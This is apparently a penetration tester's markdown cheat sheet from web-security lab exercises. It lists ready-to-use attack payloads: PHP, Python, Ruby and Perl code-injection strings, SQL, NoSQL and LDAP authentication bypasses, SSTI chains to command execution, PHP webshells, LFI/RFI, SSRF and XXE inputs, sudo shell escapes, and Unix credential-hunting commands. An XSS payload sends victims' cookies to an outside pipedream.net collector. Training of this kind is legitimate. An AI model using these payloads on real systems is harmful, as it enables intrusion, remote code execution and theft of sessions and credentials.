# Unix

* ;,||,&& promotes code injection `ping 1010101; cat pass.txt`
* .bash_history contains history (in victims home dir)
* * find /home -name .bash_history
* * find /home -name .bashrc -exec grep -H [key || export] {} \; `For alias`
* * find . -name .\*sh_history
* * find . -name .bash_history -exec grep -A 1 '^passwd or su or sudo' {} \; `find user mistake`
* * tar -zxvf (tgz,tar) -jxvf (tbz)
* * bunzip (file) (.bz2)
* * find processes running `ps -edf`
* * `openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc` decrypt file with same key `openssl enc -d -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz.enc -out /tmp/decryp.tgz`
* * find backups `find / -name backup* 2>/dev/null`
* * readable /etc/shadow? decrypt Des | $5$ SHA-256 | $6$ SHA-512 | $1$ MD5CRYPT | $2/a$ Blowfish with john hash
* * find / -name tomcat-(users.xml) 2>/dev/null
* * use mysql -u {user} -p[passw] -> no space
* * mysql passwd `strings /var/lib/mysql/mysql/user.MYD` in mysql acct {merge to similar part to john (username:*3456KSDKFS....{merge lower})}
* * mysql -> select load_file('/var/lib/mysql-files/key.txt'); for older ver
* * psql | \list | \c dbname | \d {show tables} | select stmt {su postgres -> psql}
* * psql {dbname} -U username -W
* * get passwords from configs like db.php etc in /var/www
* * sqlite {dbfile.db} .tables || "select stmt" || .schema (tablename)
* * `sudo -u victim find /home/victim -name key.txt -exec cat {} \;` || `sudo -u victim vim -> ':!/bin/bash'` || `sudo -u victim less :e /path` || `sudo -u victim awk 'BEGIN {system("/bin/sh")}'` || `gcc get.c -o get; sudo -u victim cp get foo;sudo -u victim chmod +xs foo `

```
node -e 
'var exec = require("child_process").exec;
exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {
console.log(stdOut);
});'
``` 
```    
Read file in postgres
CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;   
```

# Essentials

* modify cookies (md5 decode)
* register ('Admin','admin  ')
* check redirects and mod to 200
* check for IDOR
* check file ext (user/1.json)
* Sql ORM user[admin]=true || 0 || 1 -> add to intercept or inject 
* adding related params as above
* use concats (.,+,;) can find which prog running
```
Breaking out of PHP
eval()
By adding dummy code: ".system('uname -a'); $dummy=".
By using comment: ".system('uname -a');# or ".system('uname -a');//.

?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
?order=id);}//: we get a warning. That seems about right.
?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.
Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ?order=id);}system('uname%20-a');// for example.
This challenge is based on a vulnerability in PHPMyAdmin: CVE-2008-4096

preg_replace() until php5.5.0
the pattern is evaluated... so breaking it will result to code exec
`/e`
`?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer`
?new=system(%27whoami%27)&pattern=/lamer/e&base=Hello%20lamer

assert()
?name=hacker%27.phpinfo().%27
```
/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461
L3Vzci9sb2NhbC9iaW4vc2NvcmUgODk2MGI2NGEtZmI0MS00MGRjLWFjMWYtYWM0MDZkYzlhNDYx
```
Breaking out of Ruby
/?username=hacker"%2b`uname`%2b"

test 1.to_s
```

```
Breaking out of Python
/?username=hacker"%2bstr(os.popen("whoami").read())%2b" -> "hacker+str(code)+"

hacker"%2bstr(__import__('os').popen("whoami").read())%2b"

hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgODk2MGI2NGEtZmI0MS00MGRjLWFjMWYtYWM0MDZkYzlhNDYx')).read())%2b"

test str(1)
```

```
Breaking out of Perl
cgi-bin/hello?name=saide%27.`uname`.%27 -> '.`uname`.'

test 1.to_s
```
MongoDB
* use ' || 1==1 (%00, //, <!-->)
* /?username=admin' || 1==1%00&password=sd&submit=Submit
* /?search=admin'%20%26%26%20this.password.match(/.*/)%00 (more on hacktricks) (/^a.\*$/ inject)

Command injection (can be blind so test revshell)
* /?ip=127.0.0.1;inject or /?ip=127.0.0.1 ||, %%, |
* use /?ip=127.0.0.1\`inject\` 
* use /?ip=127.0.0.1$(inject)

Directory traversal (LFI)
* ./path
* ../file.php?=file.php (check itself)
* /../../../../../../../../../../../
* use null byte %00 to break out of fixed e.g(file='sdsd'.png')

File include (RFI)
```
<?php 
  system($_GET['c']);
?>
```
here http://assets.pentesterlab.com/test_include_system.txt
* Host ^ for include vuln with ?page=http://host&c=inject
* use null byte %00 to break out of fixed e.g(file='sdsd'.png')

LDAP
* like a database
* allows NULL bind login (send request without params)
* use bind and search to connect
```
(cn=[INPUT])
If you want to add more conditions and some boolean logic, you can use:

A boolean OR using |: (|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2].
A boolean AND using &: (&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches [INPUT1] and the password matches [INPUT2].

The end of the current filter using hacker).
An always-true condition ((cn=*) for example)
A ) to keep a valid syntax and close the first (.
A NULL BYTE (%00) to get rid of the end of the filter.

/?name=admin)(cn=*))%00&password=admin
```

Open redirects
`website that visits site given to it can be used to steal cookie and headers // XXSHUNTER, Pipeddream//`
* http://vulnwebsite/redirect.php?uri=http://{stealersite}
* http://vulnwebsite/redirect.php?uri=//{stealersite}

SQL Injection
" "
* admin' or '1'='1
* admin" or "1"="1
md5("")
* ") OR 1=1 --  ---> add a space at the end
* ") OR ("1"="1
Limit
* admin"/' or 1=1 LIMIT 1 -- 
No Space
* use tab encoding `%09` in request
* `username=admin%27%09or%091-1%09--%09&password=admin`
* use || for OR 
* instead or 1=1 we can use OR 1 // ||1
* `username=admin%27||1%23&password=admin`
With %bf
* Using the string \xBF' (URL-encoded as %bf%27), it's possible to get a single quote that will not get escaped properly. It's therefore possible to inject an always-true condition using %bf%27 or 1=1 -- and bypass the authentication.
* `username=admin%bf%27+or+1=1+--+&password=admin   `

SSRF
* `/?url=http://127.0.0.1/2/3/4:1234/`
* `/?url=http://localhost:1234/`
* `/?url=http://017700000001:1234/` 
* use a suffix that directs to localhost 
* Bypass using DNS -> localhost `localtest.me = 127.0.0.1`
* `http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt`

SSTI
* `{{ self._TemplateReference__context.cycler.__init__['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'].os.popen('ls').read() }}`
* {{self}}
Python
* try with `{{7*7}}` with url if the url is displayed
* try with `{{7*7}}` with form if the form is displayed
finding process to expolit
* try `{{''.__class__}}` --> returns something
* try `{{''.__class__.mro()[0]}}` --> returns something
* try `{{''.__class__.mro()[2].__subclasses__()}}` --> returns lots of something (change the numebers till you find type with plenty object)
* use vi to number (paste content and use `%s />/\r/g` to order &&  use `set number` %% search for Popen with `/Popen` && get number)
* try `{{''.__class__.mro()[2].__subclasses__()[Popen offset by one]}}`
* try `{{''.__class__.mro()[2].__subclasses__()[233]("uname")}}`
* * to using arguments (["uname", "-a"]) || (["uname -a"], shell=True)
* use  `{{''.__class__.mro()[2].__subclasses__()[233](["uname -a"], shell=True, stdout=-1).communicate()[0]}}`
* `%7B%7B''.__class__.mro()[2].__subclasses__()[233](["inject code"],%20shell=True,%20stdout=-1).communicate()[0]%7D%7D`

Twig(PHP)
* use `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`

File Upload
```
<?php
  system($_GET["cmd"]);
?>
```
* Upload webshell -> navigate to loacation/webshell.php?cmd=inject
* rename to php3 and others

XXE
* `<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]> <used exp> &x; </used exp>`
* XPATH -> /?name=hacker%27%20or%201=1]/parent::*/child::node()%00

XXS
* always inspect page
* test with `document.cookie`
* name=%3CsCRipt%3Ealert(%278960b64a-fb41-40dc-ac1f-ac406dc9a461%27)%3C/sCRipt%3E
* * Bypass filter with sCRipt || <scr<script>ipt>
* * ?name=hacker<scr<script>ipt>alert(%278960b64a-fb41-40dc-ac1f-ac406dc9a461%27)</scr</script>ipt>
* ?name=hacker<a onmouseover='alert(1)'>Test</a>
* ?name=hacker<img src="sdsds" onerror='alert(1)'>Test</img>
* ?name=hacker<script>eval("al"%2b"ert(1)")</script> || hname=hacker%3Cscript%3Eeval(%22al%22%2b%22ert(%27
message%27)%22)%3C/script%3E
* eval(String.fromCharCode(96,108,101,114,116,40,49,41)) --> in decimal rep
* escape script tags in variable
* * <script> var a = "input" </script> -->> ";alert(1);var j=" || ?name=hacker";alert(1);var%20j%20="2 --> Try single quotes
* escape the form in html <form action="/index.php/somethingrando"><script>alert(1)</script><"method="POST">
* * `/index.php/somethingrando"><script>alert(1)</script><`
* * `http://vulnsite/index.php/somethingrando"><script>alert('8960b64a-fb41-40dc-ac1f-ac406dc9a461')</script><`
* uriencoded passed from url `http://vulnsite/index.php#%3Cscript%3Ealert('inject')%3C/script%3E`
*   <script>
    document.write('<img src="[URL]?c='+document.cookie+'" />');
    </script>
* steal cookies with pipedream `<script>%20document.write(%27<img%20src="https://8a576325f858b619f886cc7315bec05c.m.pipedream.net/?c=%27%2bdocument.cookie%2b%27"%20/>%27);%20</script>`

PCAPS
* follow tcp/ftp strea,
* for ftp find PASV (passive mode) traverse tcp.stream eq 1
* tcp.port == <port>
* rsh protocol displays raw (follow that!)
* rlogin protocol displays raw (follow that!)
* pop protocol displays raw (follow that!)
* read all email word for word
* when you find a file with being and end (save the begin - end to a file) Use uudecod <file> (sudo apt install sharutils)
* http GET/POST/COOKIE/response text/Basic Auth/Bearer(b64) request
* http chucked (no content lenght)
* http (Connection: keep alive) uses on tcp connection to recevie multiple request
* Dns check query and anser in packet or UDP stream
* Dns (Txt record used to prove you own the domain) in Anwsers
* Dns (dns.id==0) when the id is either incremental or same
* Dns (use the transaction ID for request)to get the same response
* ICMP (check data field)
* TLS (check Server Hello,certificate,server hey exchange, server hello Done) in Certificate field
* TLS (check for sni (server name) in Extentions)
* TLS private key decode (edit->preferences->protocols->TLS->add(0.0.0.0,443,http,/path.key))
* TLS decode TLS_ECDHE_RSA ( add ^ premaster (from backdooring server to save master key))